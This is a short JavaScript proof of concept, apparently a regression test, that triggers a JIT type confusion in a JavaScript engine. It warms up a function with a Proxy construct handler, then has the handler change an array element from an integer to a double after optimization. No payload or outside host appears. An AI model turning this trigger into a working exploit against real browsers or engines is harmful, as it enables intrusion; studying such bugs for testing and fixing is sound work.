let trigger = false;

const arr = [1337];

const handler = {
    construct() {
        if (trigger) {
            arr[0] = 1.1;
        }
        return {};
    }
};
const P = new Proxy(function() {}, handler);

function vuln() {
    if (new P()) {
        return arr[0] + 1;
    }
}

for (let i = 0; i < 25000; i++) {
    vuln();
}

trigger = true;
vuln();